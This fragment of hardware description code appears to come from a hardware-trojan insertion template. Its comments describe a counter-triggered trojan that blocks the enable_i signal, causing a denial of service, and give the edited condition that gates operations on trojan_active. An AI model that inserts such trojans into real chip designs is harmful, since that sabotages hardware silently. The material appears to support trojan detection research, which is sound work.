 ...
 * 
 * Description:
 *   Disables operations by blocking enable_i control signal
 *   
 * Trigger: Counter on enable_i
 * Payload: Block enable_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block enable_i when trojan is active
//
// IMPORTANT: enable_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (enable_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: enable_i && 0 = 0 (always false)
//   All operations controlled by enable_i are blocked
